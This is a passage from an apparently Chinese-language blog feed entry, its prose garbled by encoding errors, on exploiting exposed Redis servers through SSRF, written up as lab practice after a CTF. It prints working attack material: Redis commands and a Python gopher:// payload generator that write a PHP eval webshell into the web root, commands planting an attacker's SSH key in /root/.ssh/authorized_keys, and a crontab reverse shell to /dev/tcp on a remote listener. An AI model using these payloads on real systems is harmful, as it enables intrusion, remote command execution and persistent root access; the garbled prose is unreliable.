&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br><span class="line">get webshell</span><br></pre></td></tr></table></figure><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/2.png" class=""><p>å¯ä»¥çœ‹åˆ°shellå·²ç»æˆåŠŸå†™å…¥ï¼Œè®¿é—®ä¸€ä¸‹è¯¥æ–‡ä»¶</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/3.png" class=""><p>è¿™é‡Œä¹Ÿå¯ä»¥ç”¨è„šæœ¬æ¥ç”Ÿæˆï¼Œä¹‹å‰åšè¿‡ä¸€é“redisçš„ï¼Œè„šæœ¬è¿˜å­˜ç€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.52.253.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line">def redis_format(arr):</span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x in redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x in cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/4.png" class=""><p>ç”¨ä¸Šé¢çš„è„šæœ¬ç”Ÿæˆpayloadï¼Œæ‰“è¿‡å»ï¼Œçœ‹ä¸€ä¸‹shell.phpæ–‡ä»¶å†…å®¹èƒ½å¦è¯»åˆ°</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/5.png" class=""><p>æˆåŠŸï¼Œä¸‹é¢å°±å¯ä»¥getshelläº†ï¼Œçœ‹ä¸€ä¸‹æˆ‘è¿™å°linuxæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/6.png" class=""><h4 id="å†™sshå…¬é’¥"><a href="#å†™sshå…¬é’¥" class="headerlink" title="å†™sshå…¬é’¥"></a>å†™sshå…¬é’¥</h4><p>åœ¨/rootä¸‹åˆ›å»ºä¸€ä¸ª.sshæ–‡ä»¶å¤¹</p><p>rediså‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC&#x2F;PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR&#x2F;BSq30ixoAT1vKKYMp8+8&#x2F;eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F&#x2F;3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali</span><br><span class="line">&#39;</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„æ˜¯ä¿®æ”¹äº†ä¸Šé¢çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"authorized_keys"</span></span><br><span class="line">shell=<span class="string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP1+B2rcH7ejmH9znCeQdIshPuCkiA+eAYZwApNT5vimPsk7OrP8Qw6GDKrGskY8N6tTH6YGZiNqxpVtEZIYDhiSnRxoplcGgFmMY9pCjFgUKifrN6xeA4PSuxNtUGpcOKVzs/T8SJaHLEtCzKLMnySZ/xBpMQ4CftbH1LKKNQTZRq0XCICW8q9TtZZhvhCnBqIDRD4EmmRGurObK67PjX4kPo1Ej5fIeEYUDN+tHpRP2t4a5BAgdqs7veoQS0GE6774yLyyD+LmaoiNH9NuymVQ36DZ9jOsofYDG173OKrx4tIHW3/xtYQKwgHq9TNYbmXl/c1n5Y3s1ZJ/i/2YruVcRUSMo0u1GgkNn2PDcSw2h2BGZLHm9tGLHe6mSzCIg59RBIT3SXAXqSxwzwpIlchwN0clpnnAhzd4jkKkl1usorrNL8WTWt6kLrD18SaOOO4mZStRX6nKTL3Wo/6V+A75kUQZZMeLgRxU0vWe3wnSHazwKKpf2WjDaGum3vUw0= root@kali\n\n"</span></span><br><span class="line">path=<span class="string">"/root/.ssh/"</span></span><br></pre></td></tr></table></figure><p>æ‰“è¿‡å»</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/7.png" class=""><p>çœ‹ä¸€ä¸‹èƒ½ä¸èƒ½è¯»åˆ°è¯¥æ–‡ä»¶</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/8.png" class=""><p>æˆåŠŸå†™å…¥äº†ï¼Œä½†æ˜¯sshè¿ä¸ä¸Šï¼Œè·Ÿæˆ‘å¼€å§‹æƒ³çš„ä¸€æ ·ï¼Œåº”è¯¥è¦ä¸¤å°linuxæ¥è¿›è¡Œè¯¥æ“ä½œï¼Œå¹¶ä¸”å¦ä¸€å°ä¹Ÿè¦è£…äº†redisï¼Œæ‰¾äº†ç¯‡æ–‡ç« ï¼Œæœ‰å…·ä½“æ“ä½œï¼Œå¤§æ¦‚æ˜¯è¿™æ ·ï¼Œçœ‹äº†é‚£äº›å¸ˆå‚…çš„æ€è·¯ï¼Œä»¥åŠæ€»ç»“ï¼Œå¤§æ¦‚ç‡ä¸ä¼šç¢°åˆ°è¿™ç§æƒ…å†µçš„é¢˜<a href="https://www.cnblogs.com/cute-puli/p/10870885.htmlï¼Œè¿™å°±ä»¥åæœ‰æ—¶é—´å†è‡ªå·±æ“ä½œäº†" target="_blank" rel="noopener">https://www.cnblogs.com/cute-puli/p/10870885.htmlï¼Œè¿™å°±ä»¥åæœ‰æ—¶é—´å†è‡ªå·±æ“ä½œäº†</a></p><h4 id="å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell</h4><p>èµ·ä¸¤å°æœºå­ï¼Œè™šæ‹Ÿæœºä¸Šè·‘ï¼Œéƒ½è¦è£…redis</p><p>ç›´æ¥ä¸Špayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.20:6379&gt;CONFIG SET dir &#x2F;var&#x2F;spool&#x2F;cron &lt;--åˆ‡æ¢åˆ°å®šæ—¶ä»»åŠ¡ç›®å½•</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;CONFIG SET dbfilename root   &lt;--ç”Ÿæˆä¸€ä¸ªåä¸ºrootçš„æ–‡ä»¶</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;set payload &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.160&#x2F;9999 0&gt;&amp;1\n\n&quot;  &lt;--è®¾ç½®åå¼¹shell</span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;save </span><br><span class="line">OK</span><br><span class="line">192.168.1.20:6379&gt;exit</span><br></pre></td></tr></table></figure><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/9.png" class=""><p>å¦ä¸€å°æœºå­ä¸Šç›‘å¬å¯¹åº”ç«¯å£å·ï¼Œå¾ˆå¿«å°±èƒ½å¼¹å›shellï¼Œä½†æ˜¯æˆ‘è¿™æœ‰ä¸€å°æ˜¯ubuntuï¼Œæ‰€ä»¥å¼¹ä¸å›ï¼Œæƒé™é—®é¢˜ï¼Œæœ€å¥½è¿˜æ˜¯kali+centosï¼Œä¸‹æ¬¡è£…å¥½äº†å’Œä¸Šé¢çš„sshä¸€å—å†è¯•è¯•</p><h4 id="ä¸»ä»å¤åˆ¶SSRF"><a href="#ä¸»ä»å¤åˆ¶SSRF" class="headerlink" title="ä¸»ä»å¤åˆ¶SSRF"></a>ä¸»ä»å¤åˆ¶SSRF</h4><p>å¾…è¡¥å……â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ˜¨å¤©åšäº†ç½‘é¼æ¯ç„æ­¦ç»„çš„SSRFMEé‚£é“é¢˜ï¼Œå¯¹äºredisçš„åˆ©ç”¨ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œä»Šå¤©æ­ä¸€ä¸‹ç¯å¢ƒæŠŠèƒ½åˆ©ç”¨çš„æ–¹å¼èƒ½è¿‡ä¸€é
    
    </summary>
    
    
    
      <category term="redis" scheme="http://yoursite.com/tags/redis/"/>
    
  </entry>
  
</feed>
